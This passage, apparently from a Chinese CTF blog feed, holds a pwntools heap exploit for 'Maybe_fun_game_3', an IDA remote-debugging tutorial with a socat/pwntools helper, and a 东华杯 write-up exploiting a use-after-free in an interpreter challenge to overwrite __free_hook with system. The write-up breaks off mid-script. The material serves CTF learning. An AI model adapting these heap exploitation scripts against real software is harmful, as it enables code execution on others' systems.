class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import base64</span><br><span class="line">io=process(&#x27;./Maybe_fun_game_3&#x27;)</span><br><span class="line">elf=ELF(&#x27;./Maybe_fun_game_3&#x27;)</span><br><span class="line">libc=elf.libc</span><br><span class="line">#io=remote(&#x27;47.93.163.42&#x27;, 36479)</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">def decode(a):</span><br><span class="line">mingwen=base64.b64decode(a.encode())</span><br><span class="line">mingwen=mingwen[16:]</span><br><span class="line">#print(mingwen)</span><br><span class="line">s=[]</span><br><span class="line">for i in mingwen:</span><br><span class="line">   s.append(ord(i))</span><br><span class="line">#print((s))</span><br><span class="line">for i in range(0xff,0x4f,-2):</span><br><span class="line">    key = s[s[i]]</span><br><span class="line">    for j in range(i):</span><br><span class="line">s[j] ^= key</span><br><span class="line">    #dele key</span><br><span class="line">    for k in range(s[i],i):</span><br><span class="line">s[k] = s[k+1]</span><br><span class="line">string=&#x27;&#x27;</span><br><span class="line">s=s[:8]</span><br><span class="line">for i in s:</span><br><span class="line">    string+=chr(i)</span><br><span class="line">b=u64(string)</span><br><span class="line">return b</span><br><span class="line"></span><br><span class="line">def inputs(choice):</span><br><span class="line">a=&#x27;wwnalnal\x20\x00\x00\x00\x00\x00\x00\x00&#x27;</span><br><span class="line">b=str(choice)</span><br><span class="line">b=b.ljust(0x60,&#x27;\x00&#x27;)</span><br><span class="line">b=b.ljust(0x100,&#x27;\x06&#x27;)</span><br><span class="line">mingwen=base64.b64encode(a+b)</span><br><span class="line">print(mingwen)</span><br><span class="line">return mingwen</span><br><span class="line"></span><br><span class="line">def add(a1,s):</span><br><span class="line">choice=inputs(1)</span><br><span class="line">io.recvuntil(&#x27;=\n&#x27;)</span><br><span class="line">io.recvuntil(&#x27;=\n&#x27;)</span><br><span class="line">io.recvuntil(&#x27;=\n&#x27;)</span><br><span class="line">io.recvuntil(&#x27;=\n&#x27;)</span><br><span class="line">io.recvuntil(&#x27;=\n&#x27;)</span><br><span class="line">io.sendline(choice)</span><br><span class="line">size=inputs(a1)</span><br><span class="line">io.sendlineafter(&#x27;=\n&#x27;,size)</span><br><span class="line">a=&#x27;wwnalnal\x20\x00\x00\x00\x00\x00\x00\x00&#x27;</span><br><span class="line">content=base64.b64encode(a+s)</span><br><span class="line">io.sendlineafter(&#x27;=\n&#x27;,content)</span><br><span class="line">io.recvuntil(&#x27;=\n&#x27;)</span><br><span class="line"></span><br><span class="line">def add2(a1):</span><br><span class="line">choice=inputs(1)</span><br><span class="line">io.recvuntil(&#x27;=\n&#x27;)</span><br><span class="line">io.recvuntil(&#x27;=\n&#x27;)</span><br><span class="line">io.recvuntil(&#x27;=\n&#x27;)</span><br><span class="line">io.recvuntil(&#x27;=\n&#x27;)</span><br><span class="line">io.recvuntil(&#x27;=\n&#x27;)</span><br><span class="line">io.sendline(choice)</span><br><span class="line">size=inputs(a1)</span><br><span class="line">io.sendlineafter(&#x27;=\n&#x27;,size)</span><br><span class="line">io.recvuntil(&#x27;=\n&#x27;)</span><br><span class="line"></span><br><span class="line">def dele(a1):</span><br><span class="line">choice=inputs(2)</span><br><span class="line">io.recvuntil(&#x27;=\n&#x27;)</span><br><span class="line">io.recvuntil(&#x27;=\n&#x27;)</span><br><span class="line">io.recvuntil(&#x27;=\n&#x27;)</span><br><span class="line">io.recvuntil(&#x27;=\n&#x27;)</span><br><span class="line">io.recvuntil(&#x27;=\n&#x27;)</span><br><span class="line">io.sendline(choice)</span><br><span class="line">index=inputs(a1)</span><br><span class="line">io.sendlineafter(&#x27;=\n&#x27;,index)</span><br><span class="line">io.recvuntil(&#x27;=\n&#x27;)</span><br><span class="line"></span><br><span class="line">def edit(a1,s):</span><br><span class="line">choice=inputs(3)</span><br><span class="line">io.recvuntil(&#x27;=\n&#x27;)</span><br><span class="line">io.recvuntil(&#x27;=\n&#x27;)</span><br><span class="line">io.recvuntil(&#x27;=\n&#x27;)</span><br><span class="line">io.recvuntil(&#x27;=\n&#x27;)</span><br><span class="line">io.recvuntil(&#x27;=\n&#x27;)</span><br><span class="line">io.sendline(choice)</span><br><span class="line">index=inputs(a1)</span><br><span class="line">io.sendlineafter(&#x27;=\n&#x27;,index)</span><br><span class="line">a=&#x27;wwnalnal\x20\x00\x00\x00\x00\x00\x00\x00&#x27;</span><br><span class="line">content=base64.b64encode(a+s)</span><br><span class="line">io.sendlineafter(&#x27;=\n&#x27;,content)</span><br><span class="line">io.recvuntil(&#x27;=\n&#x27;)</span><br><span class="line"></span><br><span class="line">def show(a1):</span><br><span class="line">choice=inputs(4)</span><br><span class="line">io.recvuntil(&#x27;=\n&#x27;)</span><br><span class="line">io.recvuntil(&#x27;=\n&#x27;)</span><br><span class="line">io.recvuntil(&#x27;=\n&#x27;)</span><br><span class="line">io.recvuntil(&#x27;=\n&#x27;)</span><br><span class="line">io.recvuntil(&#x27;=\n&#x27;)</span><br><span class="line">io.sendline(choice)</span><br><span class="line">index=inputs(a1)</span><br><span class="line">io.sendlineafter(&#x27;=\n&#x27;,index)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">choice=inputs(5)</span><br><span class="line">io.recvuntil(&#x27;=\n&#x27;)</span><br><span class="line">io.recvuntil(&#x27;=\n&#x27;)</span><br><span class="line">io.recvuntil(&#x27;=\n&#x27;)</span><br><span class="line">io.recvuntil(&#x27;=\n&#x27;)</span><br><span class="line">io.recvuntil(&#x27;=\n&#x27;)</span><br><span class="line">io.sendline(choice)</span><br><span class="line">size=inputs(14616)</span><br><span class="line">io.sendlineafter(&#x27;=\n&#x27;,size)</span><br><span class="line">io.recvuntil(&#x27;=\n&#x27;)</span><br><span class="line">payload=&#x27;a&#x27;*0x10</span><br><span class="line">payload=payload.ljust(0x80,&#x27;\x00&#x27;)</span><br><span class="line">payload=payload.ljust(0x100,&#x27;\x12&#x27;)</span><br><span class="line">add(56,payload)#0</span><br><span class="line">payload1=&#x27;deadbeef&#x27;*0x2</span><br><span class="line">payload1=payload1.ljust(0x60,&#x27;\x00&#x27;)</span><br><span class="line">payload1=payload1.ljust(0xff,&#x27;\x12&#x27;)</span><br><span class="line">payload1+=&#x27;\xe8&#x27;</span><br><span class="line">add(56,payload1)#1</span><br><span class="line">add(56,payload1)#2</span><br><span class="line">dele(0)</span><br><span class="line">show(1)</span><br><span class="line">io.recvuntil(&#x27;=\n&#x27;)</span><br><span class="line">io.recvuntil(&#x27;=\n&#x27;)</span><br><span class="line">show(0)</span><br><span class="line">a=io.recvuntil(&#x27;=&#x27;)</span><br><span class="line">print(&#x27;a&#x27;,a)</span><br><span class="line">malloc_hook=decode(a)-16-88</span><br><span class="line">libc_base=malloc_hook-libc.symbols[&#x27;__malloc_hook&#x27;]</span><br><span class="line">print(&#x27;libc_base&#x27;,hex(libc_base))</span><br><span class="line">io.recvuntil(&#x27;=\n&#x27;)</span><br><span class="line">onegadget=[0x45226,0x4527a,0xf03a4,0xf1247]</span><br><span class="line">global_max_fast=libc_base+0x3c67f8</span><br><span class="line">system=libc_base+libc.symbols[&#x27;system&#x27;]</span><br><span class="line"></span><br><span class="line">edit(0,p64(malloc_hook+88+16)+p64(global_max_fast-0x10))</span><br><span class="line">add(56,&#x27;/bin/sh\x00&#x27;)#3</span><br><span class="line"></span><br><span class="line">#free(v3)</span><br><span class="line">choice=inputs(5)</span><br><span class="line">io.recvuntil(&#x27;=\n&#x27;)</span><br><span class="line">io.recvuntil(&#x27;=\n&#x27;)</span><br><span class="line">io.recvuntil(&#x27;=\n&#x27;)</span><br><span class="line">io.recvuntil(&#x27;=\n&#x27;)</span><br><span class="line">io.recvuntil(&#x27;=\n&#x27;)</span><br><span class="line">io.sendline(choice)</span><br><span class="line"></span><br><span class="line">#Content</span><br><span class="line">choice=inputs(5)</span><br><span class="line">io.recvuntil(&#x27;=\n&#x27;)</span><br><span class="line">io.recvuntil(&#x27;=\n&#x27;)</span><br><span class="line">io.recvuntil(&#x27;=\n&#x27;)</span><br><span class="line">io.recvuntil(&#x27;=\n&#x27;)</span><br><span class="line">io.recvuntil(&#x27;=\n&#x27;)</span><br><span class="line">io.sendline(choice)</span><br><span class="line">io.recvuntil(&#x27;=\n&#x27;)</span><br><span class="line">io.recvuntil(&#x27;=\n&#x27;)</span><br><span class="line">a=&#x27;wwnalnal\x20\x00\x00\x00\x00\x00\x00\x00&#x27;</span><br><span class="line">content=base64.b64encode(a+p64(system))</span><br><span class="line">io.sendline(content)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">choice=inputs(5)</span><br><span class="line">io.recvuntil(&#x27;=\n&#x27;)</span><br><span class="line">io.recvuntil(&#x27;=\n&#x27;)</span><br><span class="line">io.recvuntil(&#x27;=\n&#x27;)</span><br><span class="line">io.recvuntil(&#x27;=\n&#x27;)</span><br><span class="line">io.recvuntil(&#x27;=\n&#x27;)</span><br><span class="line">io.sendline(choice)</span><br><span class="line">dele(3)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ida动态调试+pwntools输入</title>
      <link href="/2021/11/01/ida%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-pwntools%E8%BE%93%E5%85%A5/"/>
      <url>/2021/11/01/ida%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-pwntools%E8%BE%93%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h3 id="ida动态调试-pwntools输入"><a href="#ida动态调试-pwntools输入" class="headerlink" title="ida动态调试+pwntools输入"></a>ida动态调试+pwntools输入</h3><span id="more"></span><p>因为网上没有太多关于这方面的博客并且也都有些简单了(<del>对于我这种人来说并不算太友好</del>)，所以本篇记录了我一些踩坑的地方，同时也会写的尽量详细一点。</p><h3 id="ida远程调试"><a href="#ida远程调试" class="headerlink" title="ida远程调试"></a>ida远程调试</h3><p>首先在找到dbgsrv文件夹，将其中的linux_server/64放入到linux中。在linux中查看linux_serve/64有无执行权限，如果没有使用如下命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod 777 ./linux_serve/64</span><br></pre></td></tr></table></figure><p>在linux上执行./linux_serve/64,如下图</p><p><img src="/2021/11/01/ida%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-pwntools%E8%BE%93%E5%85%A5/image-20211101170431707.png" class="lazyload placeholder" data-srcset="/2021/11/01/ida%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-pwntools%E8%BE%93%E5%85%A5/image-20211101170431707.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211101170431707"></p><p>接着我们打开ida，在菜单栏找到debugger</p><p><img src="/2021/11/01/ida%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-pwntools%E8%BE%93%E5%85%A5/image-20211101165937408.png" class="lazyload placeholder" data-srcset="/2021/11/01/ida%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-pwntools%E8%BE%93%E5%85%A5/image-20211101165937408.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211101165937408"></p><p>我们选择<code>Remote linux debugger</code></p><p><img src="/2021/11/01/ida%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-pwntools%E8%BE%93%E5%85%A5/image-20211101170102888.png" class="lazyload placeholder" data-srcset="/2021/11/01/ida%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-pwntools%E8%BE%93%E5%85%A5/image-20211101170102888.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211101170102888"></p><p>紧接着我们<strong>在程序中下上断点</strong>。</p><p><img src="/2021/11/01/ida%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-pwntools%E8%BE%93%E5%85%A5/image-20211101170351244.png" class="lazyload placeholder" data-srcset="/2021/11/01/ida%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-pwntools%E8%BE%93%E5%85%A5/image-20211101170351244.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211101170351244"></p><p>然后点击debugger中的Start process，会跳出来如下弹窗</p><p><img src="/2021/11/01/ida%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-pwntools%E8%BE%93%E5%85%A5/image-20211101170929794.png" class="lazyload placeholder" data-srcset="/2021/11/01/ida%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-pwntools%E8%BE%93%E5%85%A5/image-20211101170929794.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211101170929794"></p><p>然后就会运行到断点处：</p><p><img src="/2021/11/01/ida%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-pwntools%E8%BE%93%E5%85%A5/image-20211101171050294.png" class="lazyload placeholder" data-srcset="/2021/11/01/ida%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-pwntools%E8%BE%93%E5%85%A5/image-20211101171050294.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211101171050294"></p><p><strong>如果断点下在输入函数后，需要我们先进行输入，才能到达断点处。</strong></p><p><img src="/2021/11/01/ida%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-pwntools%E8%BE%93%E5%85%A5/image-20211101171241305.png" class="lazyload placeholder" data-srcset="/2021/11/01/ida%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-pwntools%E8%BE%93%E5%85%A5/image-20211101171241305.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211101171241305"></p><p>但我们有时候需要输入不可显示字符才能使程序继续下去，所以我们需要使用pwntools来输入不可显示字符。</p><h3 id="pwntools输入"><a href="#pwntools输入" class="headerlink" title="pwntools输入"></a>pwntools输入</h3><p>我们需要首先在linux中安装socat、expect、pwntools，使用apt-get即可安装。</p><p>接着创建一个idaIOtool.sh，将如下代码复制到文件中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/expect -f</span><br><span class="line">spawn socat tcp-listen:10001,reuseaddr,fork EXEC:./CrazyVM,pty,raw,echo=0</span><br><span class="line">spawn python2</span><br><span class="line">send &quot;from pwn import *\n&quot;</span><br><span class="line">send &quot;io=remote(&#x27;127.0.0.1&#x27;,10001)\n&quot;</span><br><span class="line">interact</span><br></pre></td></tr></table></figure><p><strong>代码中 <code>./CrazyVM</code> 需要替换成自己的程序名</strong>。 </p><p>运行linux_server64</p><p><img src="/2021/11/01/ida%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-pwntools%E8%BE%93%E5%85%A5/image-20211101172157875.png" class="lazyload placeholder" data-srcset="/2021/11/01/ida%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-pwntools%E8%BE%93%E5%85%A5/image-20211101172157875.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211101172157875"></p><p>运行idaIOtool.sh</p><p><img src="/2021/11/01/ida%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-pwntools%E8%BE%93%E5%85%A5/image-20211101172341129.png" class="lazyload placeholder" data-srcset="/2021/11/01/ida%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-pwntools%E8%BE%93%E5%85%A5/image-20211101172341129.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211101172341129"></p><p>打开ida在debugger中找到Attach to process，找到运行的程序。点击ok即可调试。</p><p><img src="/2021/11/01/ida%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-pwntools%E8%BE%93%E5%85%A5/image-20211101172858732.png" class="lazyload placeholder" data-srcset="/2021/11/01/ida%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95-pwntools%E8%BE%93%E5%85%A5/image-20211101172858732.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211101172858732"></p><p>这样我们就可以使用pwntools输入不可显示字符了。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>东华杯</title>
      <link href="/2021/11/01/%E4%B8%9C%E5%8D%8E%E6%9D%AF/"/>
      <url>/2021/11/01/%E4%B8%9C%E5%8D%8E%E6%9D%AF/</url>
      
        <content type="html"><![CDATA[<h3 id="JIT类型初探"><a href="#JIT类型初探" class="headerlink" title="JIT类型初探"></a>JIT类型初探</h3><span id="more"></span><p>这种题目也碰过好几次了，但因为自己太懒加静不下心去分析这种类型(<del>其实是因为太菜，分析不了这么多代码</del>)。加上最近一直感觉自己没有什么提升，感觉一直做简单题没意思(<del>这或许就是难题不会做，简单题不想做的状态了</del>)，所以就横下心想一定要把这个题好好分析完。</p><p>这个程序实现了一个解释器，主函数逻辑如下：</p><p><img src="/2021/11/01/%E4%B8%9C%E5%8D%8E%E6%9D%AF/image-20211101102626476.png" class="lazyload placeholder" data-srcset="/2021/11/01/%E4%B8%9C%E5%8D%8E%E6%9D%AF/image-20211101102626476.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211101102626476"></p><p>我们可使用的函数如下：</p><p><img src="/2021/11/01/%E4%B8%9C%E5%8D%8E%E6%9D%AF/image-20211101102952227.png" class="lazyload placeholder" data-srcset="/2021/11/01/%E4%B8%9C%E5%8D%8E%E6%9D%AF/image-20211101102952227.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211101102952227"></p><p>一开始看到这我以为可以直接使用execve函数，然后发现execve的作用如下，并没有什么执行”/bin/sh”的功能</p><p><img src="/2021/11/01/%E4%B8%9C%E5%8D%8E%E6%9D%AF/image-20211101103142594.png" class="lazyload placeholder" data-srcset="/2021/11/01/%E4%B8%9C%E5%8D%8E%E6%9D%AF/image-20211101103142594.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211101103142594"></p><p>我们先来分析<code>=</code>的功能，在编译的时候，如果值为字符串，那么就会申请字符串长度+8大小的chunk</p><p><img src="/2021/11/01/%E4%B8%9C%E5%8D%8E%E6%9D%AF/image-20211101105104317.png" class="lazyload placeholder" data-srcset="/2021/11/01/%E4%B8%9C%E5%8D%8E%E6%9D%AF/image-20211101105104317.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211101105104317"></p><p>执行时，会判断用什么给谁赋值，我们可以发现当为字符串时，会先检查这个变量有没有被字符串赋过值，如果有则释放掉之前的字符串空间，再用新的字符换的指针替代（先申请在释放）。<strong>当用变量给变量赋值时，会将指针复制给新的变量，造成uaf漏洞</strong>。</p><p><img src="/2021/11/01/%E4%B8%9C%E5%8D%8E%E6%9D%AF/image-20211101105746472.png" class="lazyload placeholder" data-srcset="/2021/11/01/%E4%B8%9C%E5%8D%8E%E6%9D%AF/image-20211101105746472.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211101105746472"></p><p>prints比较简单，他会调用puts函数输出，因此可以用来泄露libc_base</p><p><img src="/2021/11/01/%E4%B8%9C%E5%8D%8E%E6%9D%AF/image-20211101110626118.png" class="lazyload placeholder" data-srcset="/2021/11/01/%E4%B8%9C%E5%8D%8E%E6%9D%AF/image-20211101110626118.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211101110626118"></p><p>我们接着分析array的功能，这里我们可以看见将会申请<code>0x38*v5+1</code>大小的chunk并放在<code>*（（_QWORD *）v12+6）</code>的地方。</p><p><img src="/2021/11/01/%E4%B8%9C%E5%8D%8E%E6%9D%AF/image-20211101103422281.png" class="lazyload placeholder" data-srcset="/2021/11/01/%E4%B8%9C%E5%8D%8E%E6%9D%AF/image-20211101103422281.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211101103422281"></p><p>数组赋值时会进入到下面的部分，将会把值写到<code>*(_QWORD *)(*((_QWORD *)v13+6)+0x38*v7)+0x28)</code> 相当于数组的每个元素是一个堆，v1就是数组的元素，值就会被写入v1+0x28的地方。</p><p><img src="/2021/11/01/%E4%B8%9C%E5%8D%8E%E6%9D%AF/image-20211101111358665.png" class="lazyload placeholder" data-srcset="/2021/11/01/%E4%B8%9C%E5%8D%8E%E6%9D%AF/image-20211101111358665.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211101111358665"></p><p>inputn也挺简单就是将输入的值变成数字放到对应的变量种。</p><p><img src="/2021/11/01/%E4%B8%9C%E5%8D%8E%E6%9D%AF/image-20211101112214982.png" class="lazyload placeholder" data-srcset="/2021/11/01/%E4%B8%9C%E5%8D%8E%E6%9D%AF/image-20211101112214982.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211101112214982"></p><p>分析完这些函数的功能，我们的思路就是先将申请一个0x4b0大小的chunk（a），在将它赋值给另一个变量（b），在free掉这个a，就可以泄露出libc_base。申请arr[20]数组，现在这个数组相当于a，在释放掉b，申请0x50（真实大小）大小的chunk，使堆指针到达arr[i]+0x28的位置，就能控制fd指针了。将fd指针写为free_hook-0x28，在申请一个arr[1]（大小为0x50,调试出来的结果，原本以为是0x40）,就可以将free_hook写为system。</p><p>exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#io=process(&#x27;./boom_script&#x27;)</span><br><span class="line">io=remote(&#x27;47.104.143.202&#x27; ,41299)</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line">elf=ELF(&#x27;./boom_script&#x27;)</span><br><span class="line">libc=elf.libc</span><br><span class="line">io.sendlineafter(&#x27;1. run\n2. help\n$&#x27;,&#x27;1&#x27;)</span><br><span class="line">payload=&quot;&quot;&quot;</span><br><span class="line">a = &quot;111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111&quot;;</span><br><span class="line">b = a;</span><br><span class="line">a = &quot;22222&quot;;</span><br><span class="line">prints(b);</span><br><span class="line">c = 0;</span><br><span class="line">array arr[20];</span><br><span class="line">arr[0]=10;</span><br><span class="line">arr[1]=11;</span><br><span class="line">b = &quot;/bin/sh&quot;;</span><br><span class="line">chunk1 = &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaacccccccccccccccc&quot;;</span><br><span class="line">chunk2 = &quot;bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbcccccccccccccccc&quot;;</span><br><span class="line">chunk3 = &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;;</span><br><span class="line">chunk5 = &quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&quot;;</span><br><span class="line">chunk4 = &quot;ccccccccccccccccccccccccccccccccccccccccccccccccssssssssssssssss&quot;;</span><br><span class="line">chunk1 = &quot;aaaaaaaa&quot;;</span><br><span class="line">chunk4 = &quot;aaaaaaaa&quot;;</span><br><span class="line">prints(&quot;f1agaa&quot;);</span><br><span class="line">inputn(c);</span><br><span class="line">arr[3] = c;</span><br><span class="line">chunk5 = &quot;ccccccccccccccccccccccccccccccccccccccccccccccccssssssssssssssss&quot;;</span><br><span class="line">array chunk[1];</span><br><span class="line">prints(&quot;f1agaa&quot;);</span><br><span class="line">inputn(c);</span><br><span class="line">chunk[0] = c;</span><br><span class="line">b=&quot;aaaa&quot;;</span><br><span class="line">inputn(c);</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">io.sendlineafter(&#x27;length:\n&#x27;,str(len(payload)+1))</span><br><span class="line">io.sendlineafter(&#x27;code:\n&#x27;,payload)</span><br><span class="line">#gdb.attach(io)</span><br><span class="line">malloc_hook=u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,&#x27;\x00&#x27;))-96-16</span><br><span class="line">libc_base=malloc_hook-libc.symbols[&#x27;__malloc_hook&#x27;]</span><br><span class="line">print(&#x27;libc_base&#x27;,hex(libc_base))</span><br><span 